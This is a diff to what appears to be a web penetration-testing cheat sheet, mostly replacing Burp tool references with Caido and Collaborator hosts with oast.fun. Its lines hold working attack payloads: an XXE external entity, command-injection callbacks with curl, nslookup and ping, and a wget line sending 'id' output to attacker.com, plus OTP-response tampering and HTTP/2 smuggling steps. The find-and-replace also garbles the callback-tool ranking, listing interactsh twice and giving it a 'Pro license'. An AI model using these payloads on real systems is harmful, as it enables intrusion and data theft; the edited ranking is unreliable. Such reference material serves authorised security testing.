@@ -185,7 +185,7 @@ SeLeCt * FrOm uSeRs                -- case variation
 ### Blind OOB via HTTP (DNS confirmation)
 ```xml
 <?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.burpcollaborator.net/xxe">]>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://oast.fun/xxe">]>
 <foo>&xxe;</foo>
 ```
 
@@ -250,7 +250,7 @@ POST /api/user/update
 
 # Hidden fields
 <input type="hidden" name="admin" value="true">
-# Change in Burp before sending
+# Change in Caido before sending
 
 # GraphQL introspection → find admin mutations
 {"query": "{ __schema { types { name fields { name } } } }"}
@@ -341,10 +341,10 @@ $(sleep 5)
 
 ### Blind OOB (out-of-band confirmation)
 ```bash
-; curl https://attacker.burpcollaborator.net
-; nslookup attacker.burpcollaborator.net
-$(nslookup attacker.burpcollaborator.net)
-`ping -c 1 attacker.burpcollaborator.net`
+; curl https://oast.fun
+; nslookup oast.fun
+$(nslookup oast.fun)
+`ping -c 1 oast.fun`
 ; wget https://attacker.com/$(id|base64)
 ```
 
@@ -490,13 +490,13 @@ Transfer-Encoding
 
 ### H2.CL — HTTP/2 front-end with Content-Length injection
 ```
-# In Burp Repeater, switch to HTTP/2
+# In Caido Replay, switch to HTTP/2
 # Add Content-Length header manually (not auto-set by HTTP/2)
 # Front-end ignores CL (HTTP/2 uses :content-length pseudo-header)
 # Back-end uses CL → desync
 ```
 
-### Detection (Burp)
+### Detection (Caido)
 ```
 1. Install HTTP Request Smuggler extension
 2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
@@ -588,7 +588,7 @@ ffuf -u "https://target.com/api/verify-otp" \
 
 ### Pattern 3: Response Manipulation
 ```
-Step 1: Enter wrong OTP → intercept response in Burp
+Step 1: Enter wrong OTP → intercept response in Caido
 Step 2: Change: {"success": false, "message": "Invalid OTP"} → {"success": true}
 Step 3: Forward modified response → sometimes app trusts it and proceeds
 Also try: change status code 401 → 200, or change redirect from /failed to /dashboard
@@ -699,8 +699,8 @@ asyncio.run(race())
 
 ### Tools
 ```bash
-# SAMLRaider (Burp extension) — most automated XSW testing
-# Install from BApp Store, intercept SAMLResponse, right-click → SAML Raider
+# SAMLRaider (Caido plugin) — most automated XSW testing
+# Install from Caido plugin store, intercept SAMLResponse, right-click → SAML Raider
 
 # Manual: decode, modify, re-encode
 echo "BASE64_SAML_RESPONSE" | base64 -d | xmllint --format - > saml.xml
@@ -877,9 +877,9 @@ Most engagements end at step 2 — modern WAFs trip on the parser-quirk class be
 
 ### OOB-Or-It-Didn't-Happen Gate applies everywhere
 
-Every blind primitive (blind SQLi, blind XSS, blind SSRF, blind RCE, blind XXE) needs OOB confirmation. Without it, you can't tell the bug from a parser-error log. Phase 2D's hardened lab proved the gate kills FPs that look identical to real bugs at the surface — error messages with `you have an error in your SQL syntax` text in a 500 page can be parser logs from a different request entirely, hit a Burp Collaborator domain (or interactsh) and confirm callback before filing.
+Every blind primitive (blind SQLi, blind XSS, blind SSRF, blind RCE, blind XXE) needs OOB confirmation. Without it, you can't tell the bug from a parser-error log. Phase 2D's hardened lab proved the gate kills FPs that look identical to real bugs at the surface — error messages with `you have an error in your SQL syntax` text in a 500 page can be parser logs from a different request entirely, hit a interactsh-client (oast.fun) domain (or interactsh) and confirm callback before filing.
 
-OOB callback infrastructure ranking by 2026: (1) Burp Collaborator (Pro license; cleanest), (2) interactsh-client (open source; comparable), (3) DNSLog.cn (free but logged by third party — never use for paid engagements), (4) self-hosted catch-all DNS + HTTP listener (most reliable for long-running engagements).
+OOB callback infrastructure ranking by 2026: (1) interactsh-client (oast.fun) (Pro license; cleanest), (2) interactsh-client (open source; comparable), (3) DNSLog.cn (free but logged by third party — never use for paid engagements), (4) self-hosted catch-all DNS + HTTP listener (most reliable for long-running engagements).
 
 ### Marker discipline
 
